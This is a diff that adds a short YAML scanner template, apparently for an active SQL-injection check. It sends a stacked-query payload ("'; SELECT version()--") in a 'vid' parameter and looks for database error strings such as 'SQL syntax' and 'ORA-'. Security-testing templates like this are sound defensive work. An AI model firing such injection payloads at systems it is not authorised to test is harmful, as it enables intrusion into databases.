@@ -1,0 +1,25 @@
+id: sqli3-stacked-041
+name: 'Stacked query in vid'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via vid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      vid:
+        - '''; SELECT version()--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
